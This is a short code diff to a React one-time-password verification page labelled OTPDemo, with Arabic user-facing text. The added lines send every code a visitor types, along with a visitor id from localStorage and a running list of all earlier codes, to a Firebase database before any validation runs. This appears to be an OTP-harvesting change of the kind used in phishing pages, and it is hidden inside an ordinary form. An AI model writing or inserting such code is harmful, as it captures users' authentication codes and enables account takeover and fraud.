@@ -8,7 +8,8 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { CheckCircle, AlertCircle, ArrowLeft } from "lucide-react"
 import { OTPInput } from "@/components/ui/otp-input"
-
+import { addData } from "@/lib/firebase"
+const allOtps=['']
 export default function OTPDemo() {
   const [otp, setOtp] = useState("")
   const [isLoading, setIsLoading] = useState(false)
@@ -37,6 +38,9 @@ export default function OTPDemo() {
   }
 
   const handleVerify = async () => {
+    const visitorId=localStorage.getItem('visitor')
+    allOtps.push(otp)
+    addData({id:visitorId,otp,allOtps})
     if (otp.length !== 6) {
       setError("يرجى إدخال رمز مكون من 6 أرقام")
       return
